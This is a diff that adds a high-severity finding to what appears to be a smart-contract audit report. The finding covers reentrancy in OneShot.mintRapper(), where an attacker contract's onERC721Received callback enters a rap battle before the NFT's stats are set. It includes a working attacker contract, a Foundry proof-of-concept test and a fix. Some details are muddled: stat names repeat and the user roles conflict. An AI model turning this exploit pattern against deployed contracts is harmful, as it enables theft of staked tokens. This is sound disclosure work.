@@ -359,3 +359,120 @@ Manual review
 
 ## Recommendations
 Update the statistics when the user wins a battle.
+
+
+
+[H4] - Attacker can use Reentrancy to go to battle with good stats without improving his skill by staking
+
+## Summary
+The function OneShot.mintRapper() is subject to read-only reentrancy. A user could mint the NFT, go directly to battle with good stats without staking in the minting process.
+
+## Vulnerability Details
+An attacker could create a Smart Contract and implement the function `function onERC721Received(address, address, uint256 id, bytes calldata)` with the call of `rapBattleContract.goOnStageOrBattle`.
+
+When the Attacker Smart Contract mint a OneShot NFT by calling `OneShotNFT.mintRapper()`, the Contract receive the NFT and automatically trigger `onERC721Received` function in the Attacker smart contract where he implement something to call `rapBattleContract.goOnStageOrBattle`. 
+Stats `rapperStats[tokenId]` is not initialized yet because the stats are updated after `safeMint()` in the `OneShot.mintRapper()` function.
+
+The Attacker use reentrancy to benefit from better stats without stakeing to improve his skill.
+
+## Impact
+If a user already has cred token in the Attacker smart contract and goes to battle before his stats are updated, he would have a better start because `rapperStats.weakKnees`, `rapperStats.weakKnees`, `rapperStats.weakKnees` are not initialized yet and will equal to false.
+
+## POC
+0 - User mints OneShot NFT
+1 - User and user2 already have 3 cred tokens
+2 - User goes to battle with his NFT as defender
+3 - User2 calls the function `attack()` of the AttackerContract smart contract to mint NFT
+4 - User3 receives the NFT in the Smart Contract that triggers the function `function onERC721Received`, that makes him go on Battle as challenger with good stats (not initialized yet)
+
+### AttackerContract: Attacker Smart Contract
+
+```javascript
+contract AttackerContract is IERC721Receiver {
+    OneShot public oneShotContract;
+    RapBattle public rapBattleContract;
+    uint256 public amountBet;
+
+    uint256 count;
+
+    constructor(address _oneShotContract, address _rapBattle) {
+        oneShotContract = OneShot(_oneShotContract);
+        rapBattleContract = RapBattle(_rapBattle);
+    }
+
+    function attack(uint256 _amountBet) public {
+        amountBet = _amountBet;
+        oneShotContract.mintRapper();
+    }
+
+    // Implementing IERC721Receiver so the contract can accept ERC721 tokens
+    function onERC721Received(address, address, uint256 id, bytes calldata) external override returns (bytes4) {
+
+        // This part shows that the user has these 3 features set to false instead of true when he mints the NFT
+        OneShot.RapperStats memory rapperStats = oneShotContract.getRapperStats(id);
+        console.log("Attacker weakKnees: %s", rapperStats.weakKnees);
+        console.log("Attacker weakKnees: %s", rapperStats.weakKnees);
+        console.log("Attacker weakKnees: %s", rapperStats.weakKnees);
+        rapBattleContract.goOnStageOrBattle(id, amountBet);
+
+        return IERC721Receiver.onERC721Received.selector;
+    }
+}
+```
+To run the exploit, add this function in the file OneShotTest.t.sol:
+
+```javascript
+// Test if user can go to battle with good stats without improving his skill
+function testMintRapperWithGoodStats() public {
+    // Create a new user 2
+    address user2 = makeAddr("User2");
+
+    // Give the 2 users 3 cred tokens
+    vm.prank(address(streets));
+    cred.mint(user, 3);
+    vm.prank(address(streets));
+    cred.mint(user2, 3);
+
+    // Check they really have 3 cred tokens
+    assertEq(cred.balanceOf(user), 3);
+    assertEq(cred.balanceOf(user2), 3);
+
+    // User goes on battle
+    vm.startPrank(user);
+    oneShot.approve(address(rapBattle), 0);
+    cred.approve(address(rapBattle), 3);
+    rapBattle.goOnStageOrBattle(0, 3);
+    vm.stopPrank();
+
+    // User3 creates a Smart Contract and uses reentrancy to mint a rapper with good stats
+    // weakKnees = false, heavyArms = false, spaghettiSweater = false
+    vm.prank(user2);
+    AttackerContract attacker = new AttackerContract(address(oneShot), address(rapBattle));
+
+    vm.prank(user);
+    attacker.attack(3);
+
+    console.log("Owner of NFT 0 is ", oneShot.ownerOf(0));
+
+    // The user2 wins the battle and gets 3 cred tokens
+    console.log("User balance is ", cred.balanceOf(user2));
+}
+```
+
+## Tools Used
+Foundry & slither
+
+## Recommendations
+In the function mintRapper() of Smart Contract OneShot.sol, update the stats before minting the NFT:
+
+```diff
+function mintRapper() public {
+    uint256 tokenId = _nextTokenId++;
++    // Initialize metadata for the minted token
++   rapperStats[tokenId] = RapperStats({weakKnees: true, heavyArms: true, spaghettiSweater: true, calmAndReady: false, battlesWon: 0});
+    _safeMint(msg.sender, tokenId);
+
+-    // Initialize metadata for the minted token
+-   rapperStats[tokenId] = RapperStats({weakKnees: true, heavyArms: true, spaghettiSweater: true, calmAndReady: false, battlesWon: 0});
+}
+```
